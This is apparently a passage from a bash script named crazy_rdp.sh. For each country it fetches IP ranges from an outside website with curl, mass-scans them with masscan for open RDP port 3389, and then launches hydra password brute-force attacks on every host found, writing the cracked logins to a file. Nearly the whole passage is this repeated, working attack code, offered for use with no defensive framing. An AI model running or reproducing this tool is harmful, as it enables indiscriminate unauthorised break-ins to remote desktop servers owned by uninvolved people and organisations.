read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "198" ]; then
curl http://ipdiapazon.16mb.com/Venezuela.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "199" ]; then
curl http://ipdiapazon.16mb.com/Viet_nam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "200" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "201" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands_u.s.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "202" ]; then
curl http://ipdiapazon.16mb.com/Yemen.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "203" ]; then
curl http://ipdiapazon.16mb.com/Zambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi

else
if [ $country = "204" ]; then
curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""

echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $menuoption = "5" ]; then
exit
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
